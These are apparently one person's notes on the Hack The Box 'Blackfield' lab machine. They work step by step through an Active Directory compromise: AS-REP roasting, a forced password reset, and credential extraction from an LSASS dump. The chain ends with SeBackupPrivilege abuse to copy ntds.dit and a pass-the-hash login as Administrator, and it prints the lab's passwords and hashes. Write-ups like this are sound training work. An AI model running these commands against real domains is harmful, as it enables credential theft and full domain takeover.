Windows -Active Directory · Hard


https://www.hackthebox.com/achievement/machine/1777380/255
IP =10.10.10.192

_clock-skew: 7h01m28s for `'kerbrousting'` 

black-filed IP = `10.10.10.192`
my `ip = 10.10.14.7`
## enumeration

```bash
──(pwn㉿kali)-[~/Blackfield]
└─$ sudo nmap -p- -sC -sV -T4 10.10.10.192


```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-06 21:04:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
as always we start by editing /etc/hosts add ip and blackfield.local

-steps to go
	 check `rpcclient` (access denied in the box)
	 check `smbclient for file-shares`
	 `crackmapexec`

```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ smbclient -N -L ////10.10.10.192

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 

```
-check guest access (read , write)
https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon
```bash 
┌──(pwn㉿kali)-[~/Blackfield]
└─$ nxc smb 10.10.10.192 -u 'a' -p '' --shares
profiles$ <> $  means the share is hidden


```

CIFS (Common Internet File System) is the older but widely used dialect of SMB.


```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ smbclient //10.10.10.192/profiles$
dir

bunch of usernames directories ? 
```

```bash
i put them in file

┌──(pwn㉿kali)-[~/Blackfield]
└─$ grep '^[ ]*[A-Za-z]' usernames | awk '{print $1}' > usernames.txt

now username file is ready


```

-kerbrute to check if any of these users are realy exists in the domain or active

```bash
kerbrute userenum -d BLACKFIELD.local --dc 10.10.10.192 usernames.txt
```

lets make kerbrute accesable from everywhere

```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ sudo apt install golang -y
──(pwn㉿kali)-[~]
└─$ git clone https://github.com/ropnop/kerbrute
Cloning into 'kerbrute'...
remote: Enumerating objects: 845, done.
remote: Counting objects: 100% (81/81), done.
remote: Compressing objects: 100% (22/22), done.
remote: Total 845 (delta 65), reused 59 (delta 59), pack-reused 764 (from 1)
Receiving objects: 100% (845/845), 411.84 KiB | 1.40 MiB/s, done.
Resolving deltas: 100% (383/383), done.
                                                                                                   
┌──(pwn㉿kali)-[~]
└─$ cd kerbrute
                                                                                                   
┌──(pwn㉿kali)-[~/kerbrute]
└─$ go build -o kerbrute


─(pwn㉿kali)-[~/kerbrute]
└─$ sudo mv kerbrute /usr/local/bin/
                   
```

-DONE

```bash

remeber
forensic        Disk      Forensic / Audit share.

```


```bash
2025/05/06 17:03:00 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2025/05/06 17:04:54 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:f9e8c36b9d5818efd85521c49bcad96a$4018378b2e34b82067e562590c5896434d2a5ffeb4c99d1e79559f028a04e9e612b4f141a769ced606b6915b9071905da11c14ba225f1899d84dfe9509afdb91bf611f9da6ec807930d3c55b82ea7e39e9c8c6b52370933126b36557a2448773ba0b131425e6687cfbe29a30c211d6e25e6f31600264f1c5d30d4b2af39b3d915236727d0def07236627ac5bf9227cc739c816731e66a182ae64df8e226d27f47416720c5d6d4ac68d743aa99618cc86174145f295d31a00dd1fe776f89d98b71517ee61ed83bc45ba1756d02d89cae181086ac7dc8d3cbd61d2ee6413801203e3c8d418a96ff0d290514dd0e0b298ab2bf0790afc79f5208ba07275c76f72743a9bbce9985e625d                                                                                             
2025/05/06 17:04:54 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2025/05/06 17:04:59 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local

```

```bash

audit2020@BLACKFIELD.local  can access forensic share ?
```

lets crack the support hash : `support@BLACKFIELD.local`

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 

```

```bash
GetNPUsers.py BLACKFIELD.local/ -dc-ip 10.10.10.192 -no-pass  -userrfile valid_usernames -request 
```

```bash
$krb5asrep$23$support@BLACKFIELD.LOCAL:f7a82bf92f50a8d7814f7664b21ef5a7$25ab7b9a1341a448382a7655e51d7041c638b8c151268e954e2c6f5ade54906e1937340ac85bd46a414f6d1a605c208bb212c795c197395d9411af23e1aa9a9dc053cee4d94c3ac7901df1cded071e88a2f7b4cb57e68d57de4ef6fd36f5c6379d595ab8f0cf2db5b63e86f5c40312a096ead47df3151cb31fdc6747206210bf47124b822667a80d392303104137df4613fec581f0fae81c7a1e78ffe9e6ae92e397694f48bb8ee69cb7a8d4608fe05ce06ba121e933c0aaaa5a078e5b0a720d52286c95be134e264f8066dafec9af05cf5a2190242f58c44649e984e8a5b50a34a2a1fd13227b89a7db336468a614fe4fc07a42
```

- `$krb5asrep$18$` → AES256-CTS-HMAC-SHA1-96 (etype 18)
    
- `$krb5asrep$23$` → RC4-HMAC (etype 23)
    

They are both **legitimate and valid AS-REP hashes**, just using **different encryption algorithms**.

Some tools like Kerbrute may request **AES**, while Impacket’s `GetNPUsers.py` may request **RC4**, depending on defaults or your system’s capabilities.


```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ hashcat -m 18200 support_hash_rc4 /usr/share/wordlists/rockyou.txt

support <> #00^BlackKnight  

DONE


```

-TWO paths check shares for audit user or check permission for user support
- a good practice to get password policy to not lock any account 
- check rpcclient from user support (nothing interesting)
```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ cat valid_usernames        
audit2020
support
svc_backup
```

collecting infooo.......
```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ nxc winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'             denied

┌──(pwn㉿kali)-[~/Blackfield]
└─$ nxc ldap 10.10.10.192 -u 'support' -p '#00^BlackKnight' --bloodhound -c ALL --dns-server 10.10.10.192 -d BLACKFIELD.local

┌──(pwn㉿kali)-[~/Blackfield]
└─$ bloodhound-python -d BLACKFIELD.local -c all -u support -p '#00^BlackKnight'  -ns 10.10.10.192 --zip

```

```bash
./BloodHound --in-process-gpu

```

![[Pasted image 20250506210816.png]]

`The user SUPPORT@BLACKFIELD.LOCAL has the capability to change the user AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.
`
```bash
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

```bash
net rpc password        Change a user password
```

## pre-exploitation

```bash
net rpc password AUDIT2020 Winter2025! -U "BLACKFIELD/SUPPORT%#00^BlackKnight" -S 10.10.10.192

```

```bash
AUDIT2020 Winter2025!
```


```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ nxc smb 10.10.10.192 -u 'AUDIT2020' -p 'Winter2025!' --shares                                

SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\AUDIT2020:Winter2025! 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.                                                                                           
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share                                                                                                
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server sh
```

forensic is accessable

```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ smbclient -U 'AUDIT2020' -p 'Winter2025!' //10.10.10.192/forensic
Password for [WORKGROUP\AUDIT2020]:
Try "help" to get a list of possible commands.
smb: \> ;ls
;ls: command not found
smb: \> ls
  .                                   D        0  Sun Feb 23 13:03:16 2020
  ..                                  D        0  Sun Feb 23 13:03:16 2020
  commands_output                     D        0  Sun Feb 23 18:14:37 2020
  memory_analysis                     D        0  Thu May 28 20:28:33 2020
  tools                               D        0  Sun Feb 23 13:39:08 2020

```

```bash
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 20:28:33 2020
  ..                                  D        0  Thu May 28 20:28:33 2020
 
  lsass.zip                           A 41936098  Thu May 28 20:25:08 2020
  2020

```
lsass.zip ?? how to dump
```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ pypykatz lsa minidump lsass.DMP

 Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d

Username: Administrator
				Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62

```

## EXPLOITATION

```bash

┌──(pwn㉿kali)-[~/Blackfield]
└─$ nxc winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d 
WINRM       10.10.10.192    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

```


```bash
──(pwn㉿kali)-[~/Blackfield]
└─$ sudo evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

```

![[Pasted image 20250506214102.png]]

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\desktop> whoami /all

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

SeRestorePrivilege + SeBackupPrivilege abuse ?/

SeBackupPrivilege dumping NTDS.DIT with wbadmin.exe or diskshadow.exe ???




or

-----


```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ cat backup.txt      
set verbose on 
set metadata C:\Windows\Temp\meta.cab 
set context clientaccessible 
set context persistent 
begin backup 
add volume C: alias cdrive 
create 
expose %cdrive% E: 
end backup


upload it in evil-winrm

*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s backup.txt
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b E:\Windows\ntds . ntds.dit
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM C:\Temp\system.bak

*Evil-WinRM* PS C:\Users\svc_backup\Documents> download C:\\Temp\\system.bak
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download ntds.dit



```

```bash
┌──(pwn㉿kali)-[~/Blackfield]
└─$ secretsdump.py -ntds ntds.dit -system system.bak -hashes lmhash:nthash LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:063376967b115584dd726cfba01cbf9c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:ac85b86a678c2b19e49cbcd236d037e9:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::

```

You know you need system.bak because it’s a standard requirement for extracting AD hashes from NTDS.dit in Windows Active Directory penetration testing.


```bash

evil-winrm -i blackfield.local -u administrator -H '184fb5e5178480be64824d4cd53b99ee'

or

wmiexec.py 'blackfield.local/administrator@10.10.10.192'  -hashes 'aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee'

```


![[Pasted image 20250507014642.png]]

